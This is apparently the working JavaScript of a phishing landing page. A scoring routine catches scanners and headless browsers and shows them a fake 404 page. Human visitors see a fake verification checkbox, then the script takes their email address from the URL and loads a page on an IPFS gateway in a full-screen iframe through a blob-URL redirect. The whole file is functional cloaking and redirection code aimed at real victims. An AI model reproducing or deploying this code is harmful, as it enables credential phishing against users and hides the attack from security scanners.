<script>
/* ------------------------------------------------------
         ULTIMATE ENHANCED BOT DETECTION MODULE
------------------------------------------------------ */
async function strongBotCheck() {
    let score = 0;

    /* -------------------- BASIC HEADLESS CHECKS -------------------- */
    const ua = navigator.userAgent.toLowerCase();
    const botUA = ["bot","crawl","spider","curl","wget","python","scrapy","headless","selenium","puppeteer","playwright"];
    if (botUA.some(x => ua.includes(x))) score += 40;
    if (navigator.webdriver) score += 40;

    /* -------------------- WEBGL TEST -------------------- */
    try {
        const canvas = document.createElement("canvas");
        if (!canvas.getContext("webgl")) score += 20;
    } catch { score += 20; }

    /* -------------------- AUDIO CONTEXT TEST -------------------- */
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        if (ctx.sampleRate < 30000) score += 10;
    } catch { score += 10; }

    /* -------------------- SCREEN-SIZE BEHAVIOR TEST -------------------- */
    if (screen.width < 700 || screen.height < 500) score += 10;
    if (window.outerWidth === 0) score += 20;

    let screenChanges = 0;
    window.addEventListener("resize", () => screenChanges++);
    setTimeout(() => {
        if (screenChanges > 5) score += 15;  // too many changes = bot script logic
        if (screenChanges === 0 && screen.width > 1024) score += 10; // fake desktop window
    }, 1200);

    /* -------------------- TOUCH DEVICE AUTHENTICITY TEST -------------------- */
    const claimedTouch = navigator.maxTouchPoints > 0;
    let realTouchEvents = 0;

    window.addEventListener("touchstart", () => realTouchEvents++);
    window.addEventListener("touchmove", () => realTouchEvents++);

    setTimeout(() => {
        if (claimedTouch && realTouchEvents === 0) score += 25; // fake mobile browser
    }, 800);

    /* -------------------- HONEYPOT FIELD (AUTOFILL TRAP) -------------------- */
    const honeypot = document.createElement("input");
    honeypot.type = "text";
    honeypot.style.position = "absolute";
    honeypot.style.left = "-9999px";
    honeypot.style.top = "-9999px";
    honeypot.style.opacity = "0";
    honeypot.style.pointerEvents = "none";
    document.body.appendChild(honeypot);

    setTimeout(() => {
        if (honeypot.value.length > 0) score += 40;
    }, 400);

    /* -------------------- INVISIBLE GHOST BUTTON TRAP -------------------- */
    const ghost = document.createElement("button");
    ghost.style.position = "absolute";
    ghost.style.left = "120px";
    ghost.style.top = "120px";
    ghost.style.opacity = "0";
    ghost.style.pointerEvents = "none";
    document.body.appendChild(ghost);

    document.addEventListener("click", e => {
        if (e.target === ghost) score += 40;
    });

    /* -------------------- INTERACTION ENTROPY -------------------- */
    let movements = 0;
    window.addEventListener("mousemove", () => movements++);
    window.addEventListener("touchmove", () => movements++);

    await new Promise(r => setTimeout(r, 700));

    if (movements < 3) score += 40;

    /* -------------------- LIGHT PROOF-OF-WORK -------------------- */
    const challenge = Math.random().toString(36).substring(2);
    try {
        await crypto.subtle.digest("SHA-256", new TextEncoder().encode(challenge));
    } catch {
        score += 20;
    }

    /* -------------------- FINAL DECISION -------------------- */
    return score >= 60;
}

/* ------------------------------------------------------
                 BLOB / IPFS CONFIG
------------------------------------------------------ */
const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";

function getEmail() {
    return new URLSearchParams(location.search).get("email") || "";
}

function buildIPFS(email) {
    return email ? BASE_IPFS + "#" + email : BASE_IPFS;
}

function createBlobHTML(url) {
    return `
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#fff; }
                iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
            </style>
        </head>
        <body><iframe src="${url}"></iframe></body>
        </html>
    `;
}

/* ------------------------------------------------------
                  HUMAN VERIFICATION
------------------------------------------------------ */
function requireVerification() {
    return new Promise(resolve => {
        const overlay = document.getElementById("overlay");
        const checkbox = document.getElementById("checkbox");
        const verifying = document.getElementById("verifying");

        overlay.style.opacity = 1;

        checkbox.onclick = () => {
            checkbox.style.background = "#40739e";
            checkbox.style.borderColor = "#40739e";
            verifying.style.display = "block";

            setTimeout(() => {
                overlay.style.opacity = 0;
                setTimeout(() => overlay.remove(), 300);
                resolve(true);
            }, 900);
        };
    });
}

/* ------------------------------------------------------
                     SHOW 404
------------------------------------------------------ */
function show404() {
    document.body.innerHTML = `
        <div class="error-404">
            <h1>404</h1>
            <h2>Error</h2>
            <p>The requested page could not be found.</p>
        </div>`;
}

/* ------------------------------------------------------
                      MAIN LOGIC
------------------------------------------------------ */
document.addEventListener("DOMContentLoaded", async () => {

    // Strong anti-bot check
    if (await strongBotCheck()) {
        show404();
        return;
    }

    // Human checkbox step
    await requireVerification();

    // Blob redirect
    const email = getEmail();
    const url = buildIPFS(email);
    const blobHTML = createBlobHTML(url);
    const blob = new Blob([blobHTML], { type:"text/html" });
    const blobURL = URL.createObjectURL(blob);

    window.location.href = blobURL;
});
</script>
